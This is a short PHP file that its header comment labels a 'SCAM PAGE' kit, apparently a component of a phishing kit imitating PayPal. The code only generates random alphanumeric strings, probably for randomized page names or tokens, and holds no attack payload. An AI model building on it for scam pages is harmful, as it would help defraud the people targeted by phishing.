<?php
//<!-- SCAM PAGE PPL V3 #By Mr-Tron, X Virginia  -->
$a = rand(10,1000000) . rand(10,100000);
$t = 100;
$b = substr(str_shuffle("0987654321abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $t);
function tree($t = 100) {
    return substr(str_shuffle("0987654321abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $t);
}
$r = tree() . $b . $a;
?>